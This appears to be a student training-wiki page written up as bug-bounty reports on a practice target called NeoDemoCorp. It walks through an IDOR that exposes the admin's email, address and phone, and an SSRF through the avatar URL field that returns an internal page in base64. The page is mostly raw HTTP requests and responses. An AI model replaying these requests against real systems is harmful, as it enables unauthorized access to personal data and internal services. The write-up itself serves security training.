<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  
  <link rel="shortcut icon" href="../../img/favicon.ico">
  <title>YesWeHAck - NeoDemoCorp reports - Worldskills - GJ enterprise</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />

  <link rel="stylesheet" href="../../css/theme.css" />
  <link rel="stylesheet" href="../../css/theme_extra.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css" />
  
  <script>
    // Current page data
    var mkdocs_page_name = "YesWeHAck - NeoDemoCorp reports";
    var mkdocs_page_input_path = "yeswehack\\neodemocorp.md";
    var mkdocs_page_url = null;
  </script>
  
  <script src="../../js/jquery-2.1.1.min.js" defer></script>
  <script src="../../js/modernizr-2.8.3.min.js" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
    <div class="wy-side-scroll">
      <div class="wy-side-nav-search">
        <a href="../.." class="icon icon-home"> Worldskills - GJ enterprise</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../..">Welcome to GJ enterprise documentation website !</a>
                    </li>
                </ul>
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../../ajouter_documentations/">Ajout_documentations.md</a>
                    </li>
                </ul>
                <p class="caption"><span class="caption-text">CentOs</span></p>
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../../CentOs/Changer%20le%20hostname/">Changer le hostname :</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../CentOs/Installer_apache_httpd/">Installation d'un serveur Aapche HTTPD</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../CentOs/apache_TLS_SSL/">Apache / TLS / SSL</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../CentOs/management_utilisateur_%26_groupes/">Management utilisateur & groupes</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../CentOs/regle_parfeu/">Mise en place de règles firewall</a>
                    </li>
                </ul>
                <p class="caption"><span class="caption-text">Cisco</span></p>
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../../Cisco/Alerter%20activit%C3%A9/">Alerter - Pic d'activité :</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../Cisco/Deployer%20un%20VLAN%20de%20management/">Deployer - VLAN de management :</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../Cisco/Segmenter%20les%20communications%20et%20les%20filtrer/">Segmenter - les communications :</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../Cisco/S%C3%A9curiser%20%20CDP%20et%20LLDP/">Sécuriser - CDP et LLDP :</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../Cisco/S%C3%A9curiser%20ARP%20et%20DHCP/">Sécuriser - ARP et DHCP :</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../Cisco/S%C3%A9curiser%20VLAN/">Sécuriser - Les VLAN :</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../Cisco/S%C3%A9curiser%20les%20mots%20de%20passe/">Sécuriser - Les mots de passe sur Cisco :</a>
                    </li>
                </ul>
                <p class="caption"><span class="caption-text">Exercices finale</span></p>
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../../Exercices_finale/exercice_1/">EXERCICE 1 – HARDENING LINUX - REMOTE LOGGING</a>
                    </li>
                </ul>
                <p class="caption"><span class="caption-text">Pentest</span></p>
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../../Pentest/mono_utilisateur_centos/">Devenir root en utilisant le mono-utilisateur - CentOS</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="#">CTF.live</a>
    <ul>
                <li class="toctree-l2"><a class="reference internal" href="#">B.WebApps</a>
    <ul>
                <li class="toctree-l3"><a class="reference internal" href="../../Pentest/CTF.live/B.WebApps/Ecommerce_Web_to_Shell/">Begginer WebApps - Ecommerce: Web to Shell</a>
                </li>
    </ul>
                </li>
    </ul>
                    </li>
                </ul>
                <p class="caption"><span class="caption-text">Security Onion</span></p>
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../../Security%20Onion/Port%20mirroring/">Port mirroring :</a>
                    </li>
                </ul>
                <p class="caption"><span class="caption-text">Windows   AD$</span></p>
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../../Windows%20-%20AD%24/Activer%20le%20chiffrement%20des%20donn%C3%A9es/">Activer le chiffrement des données :</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../Windows%20-%20AD%24/Mot%20de%20passe/">Mot de passe - robustesse et rotation  :</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../Windows%20-%20AD%24/Profils%20itin%C3%A9rants/">Profils itinérants :</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../../Windows%20-%20AD%24/Renforcer%20RDP/">Renforcer le protocole RDP :</a>
                    </li>
                </ul>
                <p class="caption"><span class="caption-text">Security onion</span></p>
                <ul>
                    <li class="toctree-l1"><a class="reference internal" href="../../security_onion/Installler_security_onion/">Installler security onion</a>
                    </li>
                </ul>
                <p class="caption"><span class="caption-text">Yeswehack</span></p>
                <ul class="current">
                    <li class="toctree-l1"><a class="reference internal" href="../SQL%20Injection/">SQL Injection</a>
                    </li>
                    <li class="toctree-l1"><a class="reference internal" href="../XSS%20stored/">XSS stored</a>
                    </li>
                    <li class="toctree-l1 current"><a class="reference internal current" href="./">YesWeHAck - NeoDemoCorp reports</a>
    <ul class="current">
    </ul>
                    </li>
                </ul>
      </div>
    </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="../..">Worldskills - GJ enterprise</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../..">Docs</a> &raquo;</li>
    
      
        
          <li>Yeswehack &raquo;</li>
        
      
    
    <li>YesWeHAck - NeoDemoCorp reports</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="yeswehack-neodemocorp-reports">YesWeHAck - NeoDemoCorp reports</h1>
<h1 id="idor">IDOR</h1>
<ul>
<li>On login, there is a request to get user's informations : </li>
</ul>
<pre><code>GET /users/getinfo/1248/?fields[]=email&amp;fields[]=role HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
</code></pre>

<pre><code>{&quot;email&quot;:&quot;banane@patate.fr&quot;,&quot;role&quot;:&quot;user&quot;}
</code></pre>

<ul>
<li>We can change user's ID 1248 =&gt; 1 to get admin's informations</li>
</ul>
<pre><code>GET /users/getinfo/1/?fields[]=email&amp;fields[]=role HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
</code></pre>

<pre><code>{&quot;email&quot;:&quot;joe@neodemo.corp&quot;,&quot;role&quot;:&quot;admin&quot;}
</code></pre>

<ul>
<li>Then, we can add parameters to the request to get more inforamtions</li>
</ul>
<pre><code>GET /users/getinfo/1/?fields[]=email&amp;fields[]=role&amp;fields[]=address&amp;fields[]=zipcode&amp;fields[]=phone HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
</code></pre>

<pre><code>{&quot;email&quot;:&quot;joe@neodemo.corp&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;address&quot;:&quot;2884 Elian Extension\nRolfsonfort, IN 38630-6178&quot;,&quot;zipcode&quot;:&quot;63883-16&quot;,&quot;phone&quot;:&quot;485.580.4012&quot;}
</code></pre>

<h1 id="ssrf">SSRF</h1>
<h2 id="objectif">Objectif</h2>
<ul>
<li>Faire executer au serveur distant des requêtes non voulues
=&gt; Potentielemnt atteindre des pages non authorisées</li>
</ul>
<h2 id="pre-requis">Pré-requis</h2>
<ul>
<li>Être inscrit </li>
<li>Burp suite</li>
</ul>
<h2 id="identitication">Identitication</h2>
<ul>
<li>Lors de l'édition d'édition du profile, nous pouvons y insérer une url d'une image pour l'avatar.</li>
<li>Nous pouvons nous en servir pour accéder à d'autres pages internes</li>
<li>Dans le champ <strong>Avatar Url</strong>, entrer l'url voulu : </li>
</ul>
<pre><code>https://localhost/users/add
</code></pre>

<ul>
<li>Dans burp nous voyons passer la requête</li>
</ul>
<pre><code>POST /users/edit/1341 HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5 (Ergänzendes Update)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15; -BB-NeoDemoCorp
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 183
Origin: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/users/edit/1341
Cookie: csrfToken=XXXXXXXXXX; CAKEPHP=XXXXXXXXXX
Upgrade-Insecure-Requests: 1

_method=PUT&amp;_csrfToken=XXXXXXX&amp;email=bob%40eponge.fr&amp;avatar_url=https%3A%2F%2Flocalhost%2Fusers%2Fadd&amp;address=ananas+au+fond+de+la+mer&amp;zipcode=12345&amp;city=mediteran%C3%A9e&amp;phone=123456789&amp;agent_number=1&amp;password=
</code></pre>

<ul>
<li>Nous pouvons obtenir la page voulu dans les informations utilisateurs</li>
</ul>
<pre><code>GET /users/getinfo/1341/?fields[]=email&amp;fields[]=role HTTP/1.1
Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5 (Ergänzendes Update)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15; -BB-NeoDemoCorp
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
Cookie: csrfToken=XXXXXXXXXX; CAKEPHP=XXXXXXXXXX
</code></pre>

<ul>
<li>Ajoutons des paramètres</li>
</ul>
<pre><code>GET /users/getinfo/1341/?fields[]=email&amp;fields[]=role&amp;fields[]=avatar&amp;fields[]=phone&amp;fields[]=address HTTP/1.1
</code></pre>

<pre><code>{&quot;email&quot;:&quot;bob@eponge.fr&quot;,&quot;role&quot;:&quot;user&quot;,&quot;avatar&quot;:&quot;PCFET0NUWVBFIGh0bWw+Cgo8aHRtbCBsYW5nPSIiIGNsYXNzPSJuby1qcyI+CiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCIvPiAgICAgICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCxpbml0aWFsLXNjYWxlPTEsbWluaW11bS1zY2FsZT0xIj4KCiAgICAgICAgPHRpdGxlPlVzZXJzPC90aXRsZT4KCiAgICAgICAgPGxpbmsgaHJlZj0iL2Zhdmljb24uaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIHJlbD0iaWNvbiIvPjxsaW5rIGhyZWY9Ii9mYXZpY29uLmljbyIgdHlwZT0iaW1hZ2UveC1pY29uIiByZWw9InNob3J0Y3V0IGljb24iLz48bWV0YSBuYW1lPSJhdXRob3IiLz4gICAgICAgIAoJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvY3NzL2N1c3RvbS5jc3MiLz4KCgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9jc3MvcmVkMS5jc3MiLz4KCgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9jc3MvY29tcG9uZW50cy5jc3MiLz4KCgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9jc3MvcGx1Z2lucy5jc3MiLz4KCgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9jc3MvYm9vdHN0cmFwL2Jvb3RzdHJhcC5taW4uY3NzIi8+CgogICAgPCEtLSBIVE1MNSBzaGltIGFuZCBSZXNwb25kLmpzIGZvciBJRTggc3VwcG9ydCBvZiBIVE1MNSBlbGVtZW50cyBhbmQgbWVkaWEgcXVlcmllcyAtLT4KICAgIDwhLS1baWYgbHQgSUUgOV0+CiAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL29zcy5tYXhjZG4uY29tL2h0bWw1c2hpdi8zLjcuMi9odG1sNXNoaXYubWluLmpzIj48L3NjcmlwdD4KICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vb3NzLm1heGNkbi5jb20vcmVzcG9uZC8xLjQuMi9yZXNwb25kLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8IVtlbmRpZl0tLT4gICAgICAgIAoJPHNjcmlwdCBzcmM9Ii9qcy9qcXVlcnkvanF1ZXJ5LmpzIj48L3NjcmlwdD4KCTxzY3JpcHQgc3JjPSIvanMvYm9vdHN0cmFwL2Jvb3RzdHJhcC5qcyI+PC9zY3JpcHQ+CiAgICA8L2hlYWQ+CgogICAgPGJvZHkgY2xhc3M9IlVzZXJzIGFkZCIgPjxoZWFkZXIgY2xhc3M9ImMtbGF5b3V0LWhlYWRlciBjLWxheW91dC1oZWFkZXItNiI+CiAgICA8ZGl2IGNsYXNzPSJjLW5hdmJhciI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iYy1uYXZiYXItd3JhcHBlciBjbGVhcmZpeCI+CiAgICAgICAgICAgICAgICA8bmF2IGNsYXNzPSJjLW1lZ2EtbWVudSBjLXB1bGwtcmlnaHQgYy1tZWdhLW1lbnUtZGFyayBjLW1lZ2EtbWVudS1kYXJrLW1vYmlsZSBjLXRoZW1lIGMtZm9udHMtdXBwZXJjYXNlIGMtZm9udHMtYm9sZCI+CiAgICAgICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJuYXYgbmF2YmFyLW5hdiBjLXRoZW1lLW5hdiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImMtbWVudS10eXBlLWNsYXNzaWMiPjxhIGNsYXNzPSJjLWxvZ28iIGhyZWY9Ii8iPjxpbWcgc3JjPSIvaW1nL2xvZ28ucG5nIiBjbGFzcz0ibG9nbyIgc3R5bGU9ImhlaWdodDogMzdweDsiIGFsdD0iTmVvRGVtb0NvcnAiPjwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJjLW1lbnUtdHlwZS1jbGFzc2ljIj48YSBocmVmPSIvYXJ0aWNsZXMiIGNsYXNzPSJjLWxpbmsiIHRpdGxlPSJBbGwgb2ZmZXJzIj5BbGwgb2ZmZXJzPC9hPjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0iYy1tZW51LXR5cGUtY2xhc3NpYyI+PGEgaHJlZj0iL3VzZXJzL2xvZ2luIj48YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBjLWJ0biBjLXRoZW1lLWJ0biBjLWJ0bi11cHBlcmNhc2UgYy1idG4tYm9sZCI+IFNpZ24gaW4gPC9idXR0b24+PC9hPjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImMtbWVudS10eXBlLWNsYXNzaWMiPjxhIGhyZWY9Ii91c2Vycy9hZGQiPjxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGMtYnRuIGMtdGhlbWUtYnRuIGMtYnRuLXVwcGVyY2FzZSBjLWJ0bi1ib2xkIj4gTm90IHJlZ2lzdGVyZWQgeWV0PyA8L2J1dHRvbj48L2E+PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPC9uYXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CjwvaGVhZGVyPgoKCgo8ZGl2IGNsYXNzPSJqdW1ib3Ryb24iPgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+QWRkIHVzZXI8L2gxPgogICAgPC9kaXY+CjwvZGl2PgoKPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCgogICAgPGRpdiBjbGFzcz0idXNlcnMgZm9ybSBsYXJnZS05IG1lZGl1bS04IGNvbHVtbnMgY29udGVudCI+CiAgICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBhY2NlcHQtY2hhcnNldD0idXRmLTgiIGlkPSJhZGR1c2VyIiBjbGFzcz0iZm9ybS1ob3Jpem9udGFsIiByb2xlPSJmb3JtIiBhY3Rpb249Ii91c2Vycy9hZGQiPjxkaXYgc3R5bGU9ImRpc3BsYXk6bm9uZTsiPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Il9tZXRob2QiIHZhbHVlPSJQT1NUIi8+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iX2NzcmZUb2tlbiIgYXV0b2NvbXBsZXRlPSJvZmYiIHZhbHVlPSIyNzhjNmFlMGI5MGY2ZmM2NzJmZWQ2ZDdiYzlmNWQzZjNkNGU0Zjc5OGYyNDNlNWJhNDZhYWNhMjYyYjQzYzI4MzEwMGZiNzU1YzQ3ZjY5MDBmNjI2ZWQxYTcwYjVkOTUwYTMwNzNmMTYwOTU0NTYxOTgyZGFiN2IzZWI3ZGM2YiIvPjwvZGl2PiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGVtYWlsIHJlcXVpcmVkIj48bGFiZWwgY2xhc3M9ImNvbnRyb2wtbGFiZWwiIGZvcj0iZW1haWxhZGQiPkVtYWlsIChtYW5kYXRvcnkpPC9sYWJlbD48aW5wdXQgdHlwZT0iZW1haWwiIG5hbWU9ImVtYWlsIiBpZD0iZW1haWxhZGQiIHJlcXVpcmVkPSJyZXF1aXJlZCIgbWF4bGVuZ3RoPSIyNTUiIGNsYXNzPSJmb3JtLWNvbnRyb2wiLz48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHRleHQiPjxsYWJlbCBjbGFzcz0iY29udHJvbC1sYWJlbCIgZm9yPSJhZGRyZXNzYWRkIj5BZGRyZXNzPC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iYWRkcmVzcyIgaWQ9ImFkZHJlc3NhZGQiIG1heGxlbmd0aD0iMjU1IiBjbGFzcz0iZm9ybS1jb250cm9sIi8+PC9kaXY+PGRpdiBjbGFzcz0iZm9ybS1ncm91cCB0ZXh0Ij48bGFiZWwgY2xhc3M9ImNvbnRyb2wtbGFiZWwiIGZvcj0iemlwY29kZWFkZCI+WmlwY29kZTwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9InppcGNvZGUiIGlkPSJ6aXBjb2RlYWRkIiBtYXhsZW5ndGg9IjgiIGNsYXNzPSJmb3JtLWNvbnRyb2wiLz48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHRleHQiPjxsYWJlbCBjbGFzcz0iY29udHJvbC1sYWJlbCIgZm9yPSJjaXR5YWRkIj5DaXR5PC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY2l0eSIgaWQ9ImNpdHlhZGQiIG1heGxlbmd0aD0iNTAiIGNsYXNzPSJmb3JtLWNvbnRyb2wiLz48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHRlbCI+PGxhYmVsIGNsYXNzPSJjb250cm9sLWxhYmVsIiBmb3I9InBob25lYWRkIj5QaG9uZTwvbGFiZWw+PGlucHV0IHR5cGU9InRlbCIgbmFtZT0icGhvbmUiIGlkPSJwaG9uZWFkZCIgbWF4bGVuZ3RoPSIxMiIgY2xhc3M9ImZvcm0tY29udHJvbCIvPjwvZGl2PjxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgdGV4dCI+PGxhYmVsIGNsYXNzPSJjb250cm9sLWxhYmVsIiBmb3I9ImFnZW50bnVtYmVyYWRkIj5BZ2VudCBOdW1iZXI8L2xhYmVsPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJhZ2VudF9udW1iZXIiIGlkPSJhZ2VudG51bWJlcmFkZCIgbWF4bGVuZ3RoPSI1IiBjbGFzcz0iZm9ybS1jb250cm9sIi8+PC9kaXY+ICAgICAgICAgICAgPGhyPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIHBhc3N3b3JkIHJlcXVpcmVkIj48bGFiZWwgY2xhc3M9ImNvbnRyb2wtbGFiZWwiIGZvcj0icGFzc3dvcmRhZGQiPlBhc3N3b3JkIChtYW5kYXRvcnkpPC9sYWJlbD48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmRhZGQiIHJlcXVpcmVkPSJyZXF1aXJlZCIgY2xhc3M9ImZvcm0tY29udHJvbCIvPjwvZGl2PiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgcGFzc3dvcmQyIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iY29udHJvbC1sYWJlbCIgZm9yPSJwYXNzd29yZGFkZDIiPkNvbmZpcm0gUGFzc3dvcmQgKG1hbmRhdG9yeSk8L2xhYmVsPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmRhZGQyIiByZXF1aXJlZD0icmVxdWlyZWQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGJ1dHRvbiBpZD0iY3JlYXRlYnV0dG9uIiBkaXNhYmxlZD0iZGlzYWJsZWQiIGNsYXNzPSJjLWFjdGlvbi1idG4gYnRuIGJ0bi1tZCBjLWJ0bi1zcXVhcmUgYy1idG4tYm9yZGVyLTJ4IGMtYnRuLWJsYWNrIGMtYnRuLWJvbGQgYy1idG4tdXBwZXJjYXNlIGJ0bi1kZWZhdWx0IiB0eXBlPSJzdWJtaXQiPkNyZWF0ZTwvYnV0dG9uPiAgICAgICAgPC9maWVsZHNldD4KICAgICAgICA8L2Zvcm0+ICAgIDwvZGl2PgoKPC9kaXY+Cjxicj48YnI+PGJyPjxicj48YnI+CjxzY3JpcHQ+CiAgICBmdW5jdGlvbiBjaGVja3Bhc3MoKSB7CiAgICAgICAgaWYoJCgnI3Bhc3N3b3JkYWRkJykudmFsKCkgIT0gJycgJiYgJCgnI3Bhc3N3b3JkYWRkJykudmFsKCkgPT0gJCgnI3Bhc3N3b3JkYWRkMicpLnZhbCgpKSB7ICQoJyNjcmVhdGVidXR0b24nKS5yZW1vdmVBdHRyKCdkaXNhYmxlZCcpOyB9IGVsc2UgeyAkKCcjY3JlYXRlYnV0dG9uJykucHJvcCgnZGlzYWJsZWQnLCB0cnVlKTsgIH0KICAgIH0KICAgICQoJyNwYXNzd29yZGFkZCcpLm9uKCdrZXl1cCBwYXN0ZScsZnVuY3Rpb24oKXsgY2hlY2twYXNzKCk7IH0pOwogICAgJCgnI3Bhc3N3b3JkYWRkMicpLm9uKCdrZXl1cCBwYXN0ZScsZnVuY3Rpb24oKXsgY2hlY2twYXNzKCk7IH0pOwo8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+Cgo8IS0tIFNlcnZlZCBieTogMTcyLjE5LjAuMiAtLT4K&quot;,&quot;phone&quot;:&quot;123456789&quot;,&quot;address&quot;:&quot;ananas au fond de la mer&quot;}
</code></pre>

<ul>
<li>Nous obtenons en base64 la code source la page passée en url d'avatar.</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;

&lt;html lang=&quot;&quot; class=&quot;no-js&quot;&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;utf-8&quot;/&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1,minimum-scale=1&quot;&gt;

        &lt;title&gt;Users&lt;/title&gt;

        &lt;link href=&quot;/favicon.ico&quot; type=&quot;image/x-icon&quot; rel=&quot;icon&quot;/&gt;&lt;link href=&quot;/favicon.ico&quot; type=&quot;image/x-icon&quot; rel=&quot;shortcut icon&quot;/&gt;&lt;meta name=&quot;author&quot;/&gt;        
    &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/custom.css&quot;/&gt;

    &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/red1.css&quot;/&gt;

    &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/components.css&quot;/&gt;

    &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/plugins.css&quot;/&gt;

    &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/bootstrap/bootstrap.min.css&quot;/&gt;

    &lt;!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries --&gt;
    &lt;!--[if lt IE 9]&gt;
      &lt;script src=&quot;https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js&quot;&gt;&lt;/script&gt;
      &lt;script src=&quot;https://oss.maxcdn.com/respond/1.4.2/respond.min.js&quot;&gt;&lt;/script&gt;
    &lt;![endif]--&gt;        
    &lt;script src=&quot;/js/jquery/jquery.js&quot;&gt;&lt;/script&gt;
    &lt;script src=&quot;/js/bootstrap/bootstrap.js&quot;&gt;&lt;/script&gt;
    &lt;/head&gt;

    &lt;body class=&quot;Users add&quot; &gt;&lt;header class=&quot;c-layout-header c-layout-header-6&quot;&gt;
    &lt;div class=&quot;c-navbar&quot;&gt;
        &lt;div class=&quot;container&quot;&gt;
            &lt;div class=&quot;c-navbar-wrapper clearfix&quot;&gt;
                &lt;nav class=&quot;c-mega-menu c-pull-right c-mega-menu-dark c-mega-menu-dark-mobile c-theme c-fonts-uppercase c-fonts-bold&quot;&gt;
                    &lt;ul class=&quot;nav navbar-nav c-theme-nav&quot;&gt;
                            &lt;li class=&quot;c-menu-type-classic&quot;&gt;&lt;a class=&quot;c-logo&quot; href=&quot;/&quot;&gt;&lt;img src=&quot;/img/logo.png&quot; class=&quot;logo&quot; style=&quot;height: 37px;&quot; alt=&quot;NeoDemoCorp&quot;&gt;&lt;/a&gt;&lt;/li&gt;
